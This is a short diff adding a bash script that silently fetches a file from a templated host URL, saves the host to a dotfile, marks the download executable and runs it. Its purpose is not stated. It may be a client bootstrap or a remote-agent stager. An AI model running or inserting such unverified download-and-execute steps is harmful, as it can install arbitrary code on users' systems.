@@ -1,0 +1,5 @@
+#! /bin/bash
+curl -s "{{host}}?client" -o ./gan
+echo "{{host}}" > ~/.gan_host
+chmod +x ./gan
+./gan
